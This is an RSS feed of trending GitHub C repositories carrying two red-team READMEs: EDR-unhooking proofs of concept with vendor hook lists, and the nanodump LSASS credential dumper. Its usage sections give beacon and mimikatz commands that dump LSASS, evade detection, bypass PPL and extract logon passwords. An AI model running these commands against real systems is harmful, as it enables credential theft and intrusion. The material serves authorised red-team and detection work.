<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-06-26T01:36:42Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Mr-Un1k0d3r/EDRs</title>
    <updated>2022-06-26T01:36:42Z</updated>
    <id>tag:github.com,2022-06-26:/Mr-Un1k0d3r/EDRs</id>
    <link href="https://github.com/Mr-Un1k0d3r/EDRs" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;EDRs&lt;/h1&gt; &#xA;&lt;p&gt;This repo contains information about EDRs that can be useful during red team exercise.&lt;/p&gt; &#xA;&lt;h1&gt;patch_syscall_dynamically64.c&lt;/h1&gt; &#xA;&lt;p&gt;This proof-of-concept is resolving the syscall ID dynamically no need to check the version running on the remote host. To get the information on disk (not tampered) a call to &lt;code&gt;CreateFileMapping&lt;/code&gt; and &lt;code&gt;MapViewOfFile&lt;/code&gt; Windows APIs is performed. The DLL is then parsed to retrived the data and used to patch the live code.&lt;/p&gt; &#xA;&lt;h1&gt;patch_syscall64.c&lt;/h1&gt; &#xA;&lt;p&gt;This proof-of-concept is patching the syscall ID specified in the code. The live version of the DLL is then patched using the hardcoded syscall ID and reverted to the original unpatched state.&lt;/p&gt; &#xA;&lt;h1&gt;get_syscall64.c&lt;/h1&gt; &#xA;&lt;p&gt;This utility is used to retrived the sycall ID associated with a Windows API.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;get_syscall64.exe ntdll.dll NtOpenProcess&#xA;&#xA;ntdll.dll!NtOpenProcess at 0x00007FF873F6CAD0&#xA;NtOpenProcess syscall ID 0x00000026 (38)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;unhookIAT.c&lt;/h1&gt; &#xA;&lt;p&gt;This proof-of-concept detects hooks placed by EDR/AV/Malware in the Import Address Table and replace them with original addresses (&lt;a href=&#34;https://github.com/xalicex/Unhook-Import-Address-Table&#34;&gt;coded by xalicex&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;h1&gt;Excel version of the list of hooks&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Mr-Un1k0d3r/EDRs/raw/main/EDRs.xlsx&#34;&gt;EDRs.xlsx formatted by Vincent Yiu&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Markdown version of the list of hooks&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Mr-Un1k0d3r/EDRs/raw/main/EDRs.md&#34;&gt;EDRs.md formatted by Vincent Yiu&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;EDRs Hooked APIs&lt;/h1&gt; &#xA;&lt;p&gt;Want to contribute simply run &lt;code&gt;hook_finder64.exe C:\windows\system32\ntdll.dll&lt;/code&gt; and submit the output.&lt;/p&gt; &#xA;&lt;h3&gt;CrowdStrike hooked ntdll.dll APIs&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/crowdstrike.txt&#34;&gt;CrowdStrike hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;The newer version moved away from UMH and instead rely on kernel callback as shown below:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/Mr-Un1k0d3r/EDRs/raw/main/kernel-callback.png&#34; alt=&#34;kernel callback&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;SentinelOne hooked ntdll.dll APIs&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/sentinelone.txt&#34;&gt;SentinelOne hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Cylance hooked ntdll.dll APIs (Thanks to Seemant Bisht)&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/cylance.txt&#34;&gt;Cylance hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Sophos hooked ntdll.dll APIs&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/sophos.txt&#34;&gt;Sophos hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Attivo Deception hooked ntdll.dll APIs&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/attivo.txt&#34;&gt;Attivo hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;CarbonBlack hooked ntdll.dll APIs (Thanks to Hackndo)&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/carbonblack.txt&#34;&gt;CarbonBlack hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Symantec hooked ntdll.dll APIs (Thanks to CarsonSallis)&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/symantec.txt&#34;&gt;Symantec hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;DeepInstinct hooked ntdll.dll APIs (Thanks to P0chAcc0)&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/deepinstinct.txt&#34;&gt;DeepInstinct hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;McAfee hooked ntdll.dll APIs&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/mcafee.txt&#34;&gt;McAfee hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;CheckPoint SandBlast hooked ntdll APIs&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Mr-Un1k0d3r/EDRs/raw/main/checkpoint-sandblast.txt&#34;&gt;CheckPoint SandBlast hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;ESET endpoint Security 8.0.2028.0 hooked ntdll APIs&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Mr-Un1k0d3r/EDRs/raw/main/eset.txt&#34;&gt;Eset hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;TrendMicro 17.7.1130 hooked ntdll APIs&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Mr-Un1k0d3r/EDRs/raw/main/trend.txt&#34;&gt;TrendMicro hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Cortex XDR hooked APIs (KERNEL MODE)&lt;/h3&gt; &#xA;&lt;p&gt;&lt;span&gt;âš &lt;/span&gt; These hooks are set kernel mode. They can&#39;t be unhooked from the user mode&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/cortex.txt&#34;&gt;Cortex XDR hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Bitdefender hooked ntdll APIs&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Mr-Un1k0d3r/EDRs/raw/main/bitdefender.txt&#34;&gt;Bitdefender hooks list&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Credit&lt;/h2&gt; &#xA;&lt;p&gt;Mr.Un1k0d3r RingZer0 Team&lt;/p&gt; &#xA;&lt;p&gt;And the whole community &amp;lt;3&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>helpsystems/nanodump</title>
    <updated>2022-06-26T01:36:42Z</updated>
    <id>tag:github.com,2022-06-26:/helpsystems/nanodump</id>
    <link href="https://github.com/helpsystems/nanodump" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A crappy LSASS dumper with no ASCII art&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;NanoDump&lt;/h1&gt; &#xA;&lt;p&gt;A flexible tool that creates a minidump of the LSASS process.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/resources/demo.png&#34; alt=&#34;screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Table of contents&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#features&#34;&gt;Features&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#usage&#34;&gt;Usage&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#fork&#34;&gt;Process forking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#snapshot&#34;&gt;Snapshot&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#handledup&#34;&gt;Handle duplication&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#malseclogon&#34;&gt;MalSecLogon&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#malseclogon-and-duplicate&#34;&gt;MalSecLogon and handle duplication&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#ssp&#34;&gt;Load nanodump as an SSP&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#ppl&#34;&gt;PPL bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#wer&#34;&gt;WerFault&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#params&#34;&gt;Parameters&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#examples&#34;&gt;Examples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/#redirectors&#34;&gt;HTTPS redirectors&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2 id=&#34;features&#34;&gt;1. Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;It uses syscalls (with &lt;a href=&#34;https://github.com/jthuraisamy/SysWhispers2&#34;&gt;SysWhispers2&lt;/a&gt;) for most operations.&lt;/li&gt; &#xA; &lt;li&gt;Syscalls are called from an &lt;b&gt;ntdll&lt;/b&gt; address to bypass some syscall detections.&lt;/li&gt; &#xA; &lt;li&gt;It sets the syscall callback hook to NULL.&lt;/li&gt; &#xA; &lt;li&gt;Windows APIs are called using dynamic invoke.&lt;/li&gt; &#xA; &lt;li&gt;You can choose to download the dump without touching disk or write it to a file.&lt;/li&gt; &#xA; &lt;li&gt;The minidump by default has an invalid signature to avoid detection.&lt;/li&gt; &#xA; &lt;li&gt;It reduces the size of the dump by ignoring irrelevant DLLs. The (nano)dump tends to be arround 10 MiB in size.&lt;/li&gt; &#xA; &lt;li&gt;You don&#39;t need to provide the PID of LSASS.&lt;/li&gt; &#xA; &lt;li&gt;No calls to &lt;b&gt;dbghelp&lt;/b&gt; or any other library are made, all the dump logic is implemented in nanodump.&lt;/li&gt; &#xA; &lt;li&gt;Supports process forking.&lt;/li&gt; &#xA; &lt;li&gt;Supports snapshots.&lt;/li&gt; &#xA; &lt;li&gt;Supports handle duplication.&lt;/li&gt; &#xA; &lt;li&gt;Supports MalSecLogon.&lt;/li&gt; &#xA; &lt;li&gt;Supports the PPL userland exploit.&lt;/li&gt; &#xA; &lt;li&gt;You can load nanodump in LSASS as a Security Support Provider (SSP).&lt;/li&gt; &#xA; &lt;li&gt;You can use the .exe version to run &lt;b&gt;nanodump&lt;/b&gt; outside of Cobalt Strike &lt;span&gt;ðŸ˜„&lt;/span&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2 id=&#34;usage&#34;&gt;2. Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Clone&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/helpsystems/nanodump.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Compile (optional)&lt;/h3&gt; &#xA;&lt;p&gt;&lt;b&gt;On Linux with MinGW&lt;/b&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make -f Makefile.mingw&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;b&gt;On Windows with MSVC&lt;/b&gt; (No BOF support)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmake -f Makefile.msvc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Import&lt;/h3&gt; &#xA;&lt;p&gt;Import the &lt;code&gt;NanoDump.cna&lt;/code&gt; script on Cobalt Strike.&lt;/p&gt; &#xA;&lt;h3&gt;Run&lt;/h3&gt; &#xA;&lt;p&gt;Run the &lt;code&gt;nanodump&lt;/code&gt; command in the Beacon console.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Restore the signature&lt;/h3&gt; &#xA;&lt;p&gt;Once you downloaded the minidump, restore the invalid signature&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-zsh&#34;&gt;scripts/restore_signature &amp;lt;dumpfile&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Get the secretz&lt;/h3&gt; &#xA;&lt;p&gt;&lt;b&gt;mimikatz:&lt;/b&gt;&lt;br&gt; To get the secrets simply run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;mimikatz # sekurlsa::minidump &amp;lt;dumpfile&amp;gt;&#xA;mimikatz # sekurlsa::logonPasswords full&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;b&gt;pypykatz:&lt;/b&gt;&lt;br&gt; If you prefer to stay on linux, you can use the python3 port of mimikatz called &lt;a href=&#34;https://github.com/skelsec/pypykatz&#34;&gt;pypykatz&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;python3 -m pypykatz lsa minidump &amp;lt;dumpfie&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2 id=&#34;fork&#34;&gt;3. Process forking&lt;/h2&gt; &#xA;&lt;p&gt;To avoid opening a handle to LSASS with &lt;code&gt;PROCESS_VM_READ&lt;/code&gt;, you can use the &lt;code&gt;--fork&lt;/code&gt; parameter.&lt;br&gt; This will make nanodump create a handle to LSASS with &lt;code&gt;PROCESS_CREATE_PROCESS&lt;/code&gt; access and then create a &#39;clone&#39; of the process. This new process will then be dumped. While this will result in a process creation and deletion, it removes the need to read LSASS directly.&lt;/p&gt; &#xA;&lt;h2 id=&#34;snapshot&#34;&gt;4. Snapshot&lt;/h2&gt; &#xA;&lt;p&gt;Similarly to the &lt;code&gt;--fork&lt;/code&gt; option, you can use &lt;code&gt;--snapshot&lt;/code&gt; to create a snapshot of the LSASS process.&lt;br&gt; This will make nanodump create a handle to LSASS with &lt;code&gt;PROCESS_CREATE_PROCESS&lt;/code&gt; access and then create a snapshot of the process using &lt;code&gt;PssNtCaptureSnapshot&lt;/code&gt;. This new process will then be dumped. The snapshot will be freed automatically upon completion.&lt;/p&gt; &#xA;&lt;h2 id=&#34;handledup&#34;&gt;5. Handle duplication&lt;/h2&gt; &#xA;&lt;p&gt;As opening a handle to LSASS can be detected, nanodump can instead search for existing handles to LSASS.&lt;br&gt; If one is found, it will copy it and use it to create the minidump.&lt;br&gt; Note that it is not guaranteed to find such handle.&lt;/p&gt; &#xA;&lt;h2 id=&#34;malseclogon&#34;&gt;6. MalSecLogon&lt;/h2&gt; &#xA;&lt;p&gt;To avoid opening a handle to LSASS, you can use MalSecLogon, which is a technique that (ab)uses &lt;code&gt;CreateProcessWithLogonW&lt;/code&gt; to leak an LSASS handle.&lt;br&gt; To enable this feature, use the &lt;code&gt;--malseclogon&lt;/code&gt; parameter.&lt;br&gt; Take into account that an unsigned nanodump binary needs to be written to disk to use this feature.&lt;/p&gt; &#xA;&lt;h2 id=&#34;malseclogon-and-duplicate&#34;&gt;7. MalSecLogon and handle duplication&lt;/h2&gt; &#xA;&lt;p&gt;As said before, using MalSecLogon requires a nanodump binary to be written to disk.&lt;br&gt; This can be avoided if &lt;code&gt;--malseclogon&lt;/code&gt; and &lt;code&gt;--dup&lt;/code&gt; are used together with &lt;code&gt;--binary&lt;/code&gt;.&lt;br&gt; The trick is to leak a handle to LSASS using MalSecLogon, but instead of leaking it into nanodump.exe, leak it into another binary and then duplicate the leaked handle so that nanodump can used it.&lt;/p&gt; &#xA;&lt;h2 id=&#34;ssp&#34;&gt;8. Load nanodump as an SSP&lt;/h2&gt; &#xA;&lt;p&gt;You can load nanodump as an SSP in LSASS to avoid opening a handle. The dump will be written to disk with an invalid signature at &lt;code&gt;C:\Windows\Temp\report.docx&lt;/code&gt; by default. Once the dump is completed, &lt;code&gt;DllMain&lt;/code&gt; will return FALSE to make LSASS unload the nanodump DLL.&lt;br&gt; To change the dump path and signature configuration, modify the function &lt;code&gt;NanoDump&lt;/code&gt; in &lt;a href=&#34;https://raw.githubusercontent.com/helpsystems/nanodump/main/source/entry.c&#34;&gt;entry.c&lt;/a&gt; and recompile.&lt;/p&gt; &#xA;&lt;h3&gt;Upload and load a nanodump DLL&lt;/h3&gt; &#xA;&lt;p&gt;If used with no parameters, an unsigned nanodump DLL will be uploaded to the Temp folder. Once the dump has been created, manually delete the DLL with the &lt;code&gt;delete_file&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; load_ssp&#xA;beacon&amp;gt; delete_file C:\Windows\Temp\[RANDOM].dll&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Load a local DLL&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; load_ssp c:\ssp.dll&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Load a remote DLL&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; load_ssp \\10.10.10.10\openShare\ssp.dll&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2 id=&#34;ppl&#34;&gt;9. PPL bypass&lt;/h2&gt; If LSASS is running as Protected Process Light (PPL), you can try to bypass it using a userland exploit discovered by Project Zero. If it is successful, the dump will be written to disk. &#xA;&lt;p&gt;To access this feature, use the &lt;code&gt;nanodump_ppl&lt;/code&gt; command&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump_ppl -v -w C:\Windows\Temp\lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2 id=&#34;wer&#34;&gt;10. WerFault&lt;/h2&gt; You can force the WerFault.exe process to create a full memory dump of LSASS. Take into consideration that this requires to write to the registry &#xA;&lt;p&gt;Because the dump is not made by nanodump, it will always have a valid signature.&lt;/p&gt; &#xA;&lt;p&gt;To access this feature, use the &lt;code&gt;--werfault&lt;/code&gt; parameter and the path there the dump should be created.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --werfault C:\Windows\Temp\&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A dump of the nanodump process will also be created, similar to this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; dir &#39;C:\Windows\Temp\lsass.exe-(PID-648)-4035593\&#39;&#xA;&#xA;Directory: C:\Windows\Temp\lsass.exe-(PID-648)-4035593&#xA;&#xA;Mode                 LastWriteTime         Length Name&#xA;----                 -------------         ------ ----&#xA;-a----         6/23/2022   7:40 AM       58830409 lsass.exe-(PID-648).dmp&#xA;-a----         6/23/2022   7:40 AM        7862825 nanodump.x64.exe-(PID-3224).dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2 id=&#34;params&#34;&gt;11. Parameters&lt;/h2&gt; &#xA;&lt;h4&gt;--getpid&lt;/h4&gt; &#xA;&lt;p&gt;Get PID of LSASS and leave.&lt;br&gt; This is just for convenience, nanodump does not need the PID of LSASS.&lt;/p&gt; &#xA;&lt;h4&gt;--write -w &amp;lt; path &amp;gt; (required for EXE)&lt;/h4&gt; &#xA;&lt;p&gt;Where to write the dumpfile.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;BOF&lt;/strong&gt;: If this parameter is not provided, the dump will be downloaded in a fileless manner.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;EXE&lt;/strong&gt;: This parameter is required given that no C2 channel exists&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;--valid -v&lt;/h4&gt; &#xA;&lt;p&gt;The minidump will have a valid signature.&lt;br&gt; If not entered, the signature will be invalid. Before analyzing the dump restore the signature of the dump, with:&lt;br&gt; &lt;code&gt;scripts/restore_signature &amp;lt;dumpfile&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;--fork -f&lt;/h4&gt; &#xA;&lt;p&gt;Fork LSASS and dump this new process.&lt;/p&gt; &#xA;&lt;h4&gt;--snapshot -s&lt;/h4&gt; &#xA;&lt;p&gt;Create a snapshot of LSASS and dump this new process.&lt;/p&gt; &#xA;&lt;h4&gt;--dup -d&lt;/h4&gt; &#xA;&lt;p&gt;Try to find an existing handle to LSASS and duplicate it.&lt;/p&gt; &#xA;&lt;h4&gt;--malseclogon -m&lt;/h4&gt; &#xA;&lt;p&gt;Leak a handle to LSASS using MalSecLogon.&lt;br&gt; &lt;strong&gt;If used as BOF, an unsigned binary will be written to disk unless --dup is also provided!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h4&gt;--binary -b &amp;lt; path &amp;gt;&lt;/h4&gt; &#xA;&lt;p&gt;Path to a binary such as &lt;code&gt;C:\Windows\notepad.exe&lt;/code&gt;.&lt;br&gt; This option is used exclusively with &lt;code&gt;--malseclogon&lt;/code&gt; and &lt;code&gt;--dup&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;--werfault -wf &amp;lt; folder &amp;gt;&lt;/h4&gt; &#xA;&lt;p&gt;Path to the folder where the WerFault process will create an LSASS dump.&lt;/p&gt; &#xA;&lt;h2 id=&#34;examples&#34;&gt;12. Examples&lt;/h2&gt; &#xA;&lt;p&gt;Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --fork --write C:\lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use MalSecLogon to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and download the dump with a valid signature:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --malseclogon --dup --fork --binary C:\Windows\notepad.exe --valid&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get a handle with MalSecLogon, read LSASS indirectly by using a fork and write the dump to disk with a valid signature (a nanodump binary will be uploaded!):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --malseclogon --fork --valid --write C:\Windows\Temp\lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Download the dump with an invalid signature (default):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Duplicate an existing handle and write the dump to disk with an invalid signature:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --dup --write C:\Windows\Temp\report.docx&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get the PID of LSASS:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --getpid&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Load nanodump in LSASS as an SSP (a nanodump binary will be uploaded!):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; load_ssp&#xA;beacon&amp;gt; delete_file C:\Windows\Temp\[RANDOM].dll&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Load nanodump in LSASS as an SSP remotely:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; load_ssp \\10.10.10.10\openShare\nanodump_ssp.x64.dll&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Dump LSASS bypassing PPL, duplicating the handle that csrss.exe has on LSASS:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump_ppl --dup --write C:\Windows\Temp\lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Make the WerFault.exe process create a full memory dump in the Temp folder:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --werfault C:\Windows\Temp\&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2 id=&#34;redirectors&#34;&gt;13. HTTPS redirectors&lt;/h2&gt; &#xA;&lt;p&gt;If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.&lt;br&gt; Increase the max size of requests on your web server to allow nanodump to download the dump.&lt;/p&gt; &#xA;&lt;h4&gt;NGINX&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;location ~ ^...$ {&#xA;    ...&#xA;    client_max_body_size 50M;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Apache2&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;Directory &#34;...&#34;&amp;gt;&#xA;    LimitRequestBody  52428800&#xA;&amp;lt;/Directory&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/skelsec&#34;&gt;skelsec&lt;/a&gt; for writing &lt;a href=&#34;https://github.com/skelsec/minidump&#34;&gt;minidump&lt;/a&gt;, which was crucial for learning the minidump file format.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/freefirex2&#34;&gt;freefirex&lt;/a&gt; from &lt;a href=&#34;https://github.com/trustedsec/CS-Situational-Awareness-BOF&#34;&gt;CS-Situational-Awareness-BOF&lt;/a&gt; at Trustedsec for many cool tricks for BOFs&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/Jackson_T&#34;&gt;Jackson_T&lt;/a&gt; for &lt;a href=&#34;https://github.com/jthuraisamy/SysWhispers2&#34;&gt;SysWhispers2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/BillDemirkapi&#34;&gt;BillDemirkapi&lt;/a&gt; for &lt;a href=&#34;https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/&#34;&gt;Process Forking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/splinter_code&#34;&gt;Antonio Cocomazzi&lt;/a&gt; for &lt;a href=&#34;https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html&#34;&gt;MalSecLogon&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/_xpn_&#34;&gt;xpn&lt;/a&gt; for &lt;a href=&#34;https://blog.xpnsec.com/exploring-mimikatz-part-2/&#34;&gt;Exploring Mimikatz - Part 2 - SSP&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/matteomalvica&#34;&gt;Matteo Malvica&lt;/a&gt; for &lt;a href=&#34;https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/&#34;&gt;Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/tiraniddo&#34;&gt;James Forshaw&lt;/a&gt; for &lt;a 